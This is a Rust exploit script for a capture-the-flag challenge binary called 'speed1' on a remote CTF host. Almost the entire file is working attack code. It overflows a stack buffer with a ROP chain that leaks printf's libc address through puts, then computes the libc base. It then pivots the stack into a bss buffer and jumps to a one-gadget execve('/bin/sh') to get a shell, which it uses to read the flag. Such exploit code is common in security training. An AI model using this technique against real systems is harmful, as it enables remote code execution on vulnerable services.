use std::net::TcpStream;
use std::io::{Write, Read};
use std::error::Error;
use std::env;
use std::process::{Command, Stdio};

static LOCAL: bool = false;

/* target information 
 * speed-01.hfsc.tf 61000
 * stack buffer overflow provided
 * NX enabled by PIE off
 * no canary
 * 0x00007ffff7dec000
 */

/* one gadget output libc.so.6 
    0xe3b2e execve("/bin/sh", r15, r12)
    constraints:
    [r15] == NULL || r15 == NULL
    [r12] == NULL || r12 == NULL

    0xe3b31 execve("/bin/sh", r15, rdx)
    constraints:
    [r15] == NULL || r15 == NULL
    [rdx] == NULL || rdx == NULL

    0xe3b34 execve("/bin/sh", rsi, rdx)
    constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL
 */

fn parse_args(args: Vec<String>) -> String {
    if args.len() < 3 {
        panic!("Error: usage <binary> <address> <port>");
    }
    let mut addr: String = args[1].to_string().clone();
    addr.push_str(":");
    addr.push_str(&args[2]);
    return addr;
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut recvbuf: [u8; 4096] = [0; 4096];
    const BUF_LEN: usize = 0x28;
    const PUTS_FUNC_ADDR: u64 = 0x401080;
    const GETS_FUNC_ADDR: u64 = 0x004010b0;
    const PRINTF_GOT: u64 = 0x404020;
    const PRINTF_OFFSET: u64 = 0x61cc0;
    const BSS_BUFFER: u64 = 0x00404068;
    
    const POP_RDI_RET: u64 = 0x004012b3;
    const POP_RBP_RET: u64 = 0x0040119d;
    const LEAVE_RET: u64 = 0x0040124c;

    // overflow and leak address of libc function by 
    // puts(printf GOT address) = printf libc address
    let mut payload: Vec<u8> = Vec::new();
    payload.extend_from_slice(&[0x41; BUF_LEN]);
    payload.extend_from_slice(&POP_RDI_RET.to_le_bytes());
    payload.extend_from_slice(&PRINTF_GOT.to_le_bytes());
    payload.extend_from_slice(&PUTS_FUNC_ADDR.to_le_bytes());

    // prepare for reading into a known buffer address after 
    // calculating one gadget address. Choose small buffer in 
    // bss writeable section. Pop into RBP and use leave to 
    // pivot RSP to the known buffer address
    payload.extend_from_slice(&POP_RDI_RET.to_le_bytes());
    payload.extend_from_slice(&BSS_BUFFER.to_le_bytes());
    payload.extend_from_slice(&GETS_FUNC_ADDR.to_le_bytes());
    payload.extend_from_slice(&POP_RBP_RET.to_le_bytes());
    payload.extend_from_slice(&BSS_BUFFER.to_le_bytes());
    payload.extend_from_slice(&LEAVE_RET.to_le_bytes());
    payload.extend_from_slice(b"\n");

    // payload.extend_from_slice(&ONE_GADGET.to_le_bytes());

    if LOCAL {
        let mut child = Command::new("./speed1")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()?;

        let mut r = child.stdout.take().unwrap();
        let mut w = child.stdin.take().unwrap();

        let mut n = r.read(&mut recvbuf)?;
        eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));

        std::thread::sleep(std::time::Duration::from_secs(10));

        n = w.write(&payload)?;
        eprintln!("sent {} bytes", n);

        r.read(&mut recvbuf)?;
        let mut leak: [u8; 8] = Default::default();
        leak[0..6].copy_from_slice(&recvbuf[0..6]);
        let printf = u64::from_le_bytes(leak);
        eprintln!("\n\nleaked printf() address: {:#02x}", printf);

        let libc_base: u64 = printf - PRINTF_OFFSET;
        let one_gadget: u64 = 0xe3b31 + libc_base;
        eprintln!("libc base address: {:#02x}", libc_base);

        // write one-gadget address to bss buffer to hijack execution
        // leave is essentially mov rsp, rbp ; pop rbp
        // so pad with 8 A's  
        let mut payload: Vec<u8> = Vec::new();
        payload.extend_from_slice(&[0x41; 8]);
        payload.extend_from_slice(&one_gadget.to_le_bytes());
        payload.extend_from_slice(b"\n");
        n = w.write(&payload)?;
        eprintln!("sent {} bytes", n);

        n = r.read(&mut recvbuf)?;
        eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));

    }
    else {
        // create read and write fds, sleep
        let args: Vec<String> = env::args().collect();
        let addr: String = parse_args(args);
        println!("Connecting to {}", addr);

        let mut r = TcpStream::connect(addr)?;
        let mut w = r.try_clone()?;
        std::thread::sleep(std::time::Duration::from_secs(2));

        // read initial prompt
        let mut n = r.read(&mut recvbuf)?;
        eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));
        
        std::thread::sleep(std::time::Duration::from_secs(1));

        // // write payload
        n = w.write(&payload)?;
        eprintln!("sent {} bytes", n);

        std::thread::sleep(std::time::Duration::from_secs(1));

        // // leak address for printf, and calculate libc base address
        r.read(&mut recvbuf)?;
        let mut leak: [u8; 8] = Default::default();
        leak[0..6].copy_from_slice(&recvbuf[0..6]);
        let printf = u64::from_le_bytes(leak);
        eprintln!("\nleaked printf() address: {:#02x}", printf);

        let libc_base: u64 = printf - PRINTF_OFFSET;
        let one_gadget: u64 = 0xe3b31 + libc_base;
        eprintln!("libc base address: {:#02x}\n", libc_base);

        // write one-gadget address to bss buffer to hijack execution
        // leave is essentially mov rsp, rbp ; pop rbp
        // so pad with 8 A's  
        let mut payload: Vec<u8> = Vec::new();
        payload.extend_from_slice(&[0x41; 8]);
        payload.extend_from_slice(&one_gadget.to_le_bytes());
        payload.extend_from_slice(b"\n");
        n = w.write(&payload)?;
        eprintln!("sent {} bytes", n);

        // // // send command
        w.write(b"cat flag\n")?;

        // read output
        n = r.read(&mut recvbuf)?;
        eprintln!("flag: {}", String::from_utf8_lossy(&recvbuf[..n]));

    }

    Ok(())
}
